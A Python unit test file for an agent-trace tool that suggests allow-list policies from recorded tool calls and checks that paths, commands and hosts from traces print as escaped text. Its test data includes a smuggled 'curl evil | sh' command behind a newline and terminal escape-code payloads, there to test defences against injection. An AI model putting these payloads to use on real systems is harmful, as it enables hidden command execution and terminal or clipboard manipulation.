"""Tests for policy suggestion (issue #19)."""

import io
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.policy import (
    PolicySuggestion,
    _collapse_commands,
    _collapse_paths,
    format_suggestion,
    observe_session,
    render_policy_json,
    suggest_policy,
)
from agent_trace.store import TraceStore

try:
    import _escapes
except ImportError:
    from tests import _escapes


def _make_store_with_session(events):
    tmpdir = tempfile.mkdtemp()
    store = TraceStore(tmpdir)
    meta = SessionMeta(agent_name="test")
    store.create_session(meta)
    for e in events:
        e.session_id = meta.session_id
        store.append_event(meta.session_id, e)
    return store, meta.session_id


class TestCollapsePaths(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(_collapse_paths([]), [])

    def test_single_file(self):
        result = _collapse_paths(["src/foo.py"])
        self.assertIn("src/foo.py", result)

    def test_collapses_three_files_same_dir(self):
        paths = ["src/a.py", "src/b.py", "src/c.py"]
        result = _collapse_paths(paths)
        self.assertIn("src/**", result)

    def test_keeps_individual_files_different_dirs(self):
        paths = ["src/a.py", "tests/b.py"]
        result = _collapse_paths(paths)
        self.assertIn("src/a.py", result)
        self.assertIn("tests/b.py", result)


class TestCollapseCommands(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(_collapse_commands([]), [])

    def test_single_command(self):
        result = _collapse_commands(["pytest"])
        self.assertIn("pytest", result)

    def test_collapses_variants(self):
        cmds = ["pytest tests/foo.py", "pytest tests/bar.py -x"]
        result = _collapse_commands(cmds)
        self.assertIn("pytest *", result)

    def test_different_bases_kept_separate(self):
        cmds = ["git status", "npm install"]
        result = _collapse_commands(cmds)
        self.assertTrue(any("git" in r for r in result))
        self.assertTrue(any("npm" in r for r in result))


class TestObserveSession(unittest.TestCase):
    def test_reads_files(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "read",
                "arguments": {"file_path": "src/main.py"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        obs = observe_session(store, sid)
        self.assertIn("src/main.py", obs["files_read"])

    def test_writes_files(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "write",
                "arguments": {"file_path": "output.txt"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        obs = observe_session(store, sid)
        self.assertIn("output.txt", obs["files_written"])

    def test_bash_commands(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "bash",
                "arguments": {"command": "pytest tests/"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        obs = observe_session(store, sid)
        self.assertIn("pytest tests/", obs["commands"])

    def test_network_hosts_extracted(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "bash",
                "arguments": {"command": "curl https://api.example.com/data"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        obs = observe_session(store, sid)
        self.assertIn("api.example.com", obs["network_hosts"])


class TestSuggestPolicy(unittest.TestCase):
    def test_suggest_produces_report(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "read",
                "arguments": {"file_path": "src/a.py"},
            }),
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "write",
                "arguments": {"file_path": "out.txt"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        suggestion = suggest_policy(store, [sid])
        self.assertIn("src/a.py", suggestion.files_read)
        self.assertIn("out.txt", suggestion.files_written)

    def test_render_policy_json(self):
        events = [
            TraceEvent(event_type=EventType.TOOL_CALL, data={
                "tool_name": "bash",
                "arguments": {"command": "pytest"},
            }),
        ]
        store, sid = _make_store_with_session(events)
        suggestion = suggest_policy(store, [sid])
        policy = render_policy_json(suggestion)
        self.assertIn("commands", policy)
        self.assertIn("allow", policy["commands"])


# A payload with no whitespace and no slash, for a value that cannot hold
# them: a command pattern keeps only the first word of a command, and a host
# ends at whitespace or a slash.
WORD = "A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"
WORD_TEXT = r"A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"
WORD_PLAIN = "café✓日本語😀"


def _tool(tool_name: str, **arguments) -> TraceEvent:
    return TraceEvent(event_type=EventType.TOOL_CALL,
                      data={"tool_name": tool_name, "arguments": arguments})


def _suggested(events: list[TraceEvent]) -> PolicySuggestion:
    with tempfile.TemporaryDirectory() as tmp:
        store = TraceStore(tmp, redact=False)
        meta = SessionMeta(agent_name="test")
        store.create_session(meta)
        for event in events:
            event.session_id = meta.session_id
            store.append_event(meta.session_id, event)
        return suggest_policy(store, [meta.session_id])


def _suggestion(**lists) -> PolicySuggestion:
    """Return a suggestion with plain text in each list that *lists* leaves out."""
    fields = {
        "session_ids": ["s1"], "files_read": [], "files_written": [], "commands": [],
        "network_hosts": ["example.com"], "file_read_patterns": ["src/**"],
        "file_write_patterns": ["out.txt"], "cmd_patterns": ["pytest *"],
    }
    fields.update(lists)
    return PolicySuggestion(**fields)


def _render_suggestion(suggestion: PolicySuggestion) -> str:
    """Return what policy generate --dry-run prints for *suggestion*."""
    out = io.StringIO()
    format_suggestion(suggestion, out=out, dry_run=True)
    return out.getvalue()


def _generated(events: list[TraceEvent]) -> str:
    return _render_suggestion(_suggested(events))


# (label, kind, build): build(value) returns a policy suggestion with value in
# the place the label names. The kinds are in tests/_escapes.py.
FORMAT_SUGGESTION_CASES = [
    ("file read pattern", "text", lambda v: _suggestion(file_read_patterns=["src/**", v])),
    ("file write pattern", "text", lambda v: _suggestion(file_write_patterns=["out.txt", v])),
    ("command pattern", "text", lambda v: _suggestion(cmd_patterns=["pytest *", v])),
    ("network host", "text", lambda v: _suggestion(network_hosts=["example.com", v])),
]

# (label, kind, build): build(value) returns the events of a session with
# value in the place the label names.
POLICY_GENERATE_CASES = [
    ("Read path", "text", lambda v: [_tool("read", file_path=v)]),
    ("Grep path", "text", lambda v: [_tool("grep", path=v)]),
    ("Write path", "text", lambda v: [_tool("write", file_path=v)]),
    ("Edit path", "text", lambda v: [_tool("edit", file_path=v)]),
]


class TestPolicyGenerateShowsTraceTextAsText(unittest.TestCase):
    """policy generate copies paths, commands and hosts from traces, where the
    agent chose them, so each can hold escape codes and line breaks. It shows
    them as text."""

    def test_each_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, FORMAT_SUGGESTION_CASES, _render_suggestion)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, FORMAT_SUGGESTION_CASES, _render_suggestion)

    def test_each_path_from_a_trace_shows_escapes_as_text(self):
        _escapes.check_each_value(self, POLICY_GENERATE_CASES, _generated)
        _escapes.check_plain_text_unchanged(self, POLICY_GENERATE_CASES, _generated)

    def test_command_and_host_from_a_trace_show_escapes_as_text(self):
        def render(word):
            return _generated([_tool("bash", command=word),
                               _tool("bash", command=f"curl https://{word}/x")])

        output = render(WORD)
        _escapes.assert_shows_as_text(self, output, WORD_TEXT, render("plain"))
        self.assertIn(f"  Commands (allow):\n    {WORD_TEXT}\n", output)
        self.assertIn(f"  Network hosts (allow):\n    {WORD_TEXT}\n", output)
        plain = render(WORD_PLAIN)
        self.assertIn(f"  Commands (allow):\n    {WORD_PLAIN}\n    curl *\n", plain)
        self.assertIn(f"  Network hosts (allow):\n    {WORD_PLAIN}\n", plain)

    def test_line_break_shows_as_escape(self):
        output = _generated([_tool("read", file_path="docs/a.md\n.env")])
        self.assertIn("  Files read (allow):\n    docs/a.md\\n.env\n", output)
        # A command pattern from a trace keeps only the first word, so this
        # one is built directly.
        output = _render_suggestion(_suggestion(cmd_patterns=["echo safe\ncurl evil | sh"]))
        self.assertIn("    echo safe\\ncurl evil | sh\n", output)

    def test_sgr_code_shows_as_text(self):
        output = _generated([_tool("read", file_path="a\x1b[8mhidden")])
        self.assertIn(r"    a\x1b[8mhidden", output)
        self.assertNotIn("\x1b", output)

    def test_policy_keeps_the_raw_text(self):
        policy = render_policy_json(_suggested([
            _tool("read", file_path=_escapes.PAYLOAD),
            _tool("write", file_path=_escapes.PAYLOAD),
            _tool("bash", command=WORD),
            _tool("bash", command=f"curl https://{WORD}/x"),
        ]))
        self.assertEqual(policy["files"]["read"]["allow"], [_escapes.PAYLOAD])
        self.assertEqual(policy["files"]["write"]["allow"], [_escapes.PAYLOAD])
        self.assertEqual(policy["commands"]["allow"], [WORD, "curl *"])
        self.assertEqual(policy["network"]["allow"], [WORD])


if __name__ == "__main__":
    unittest.main()
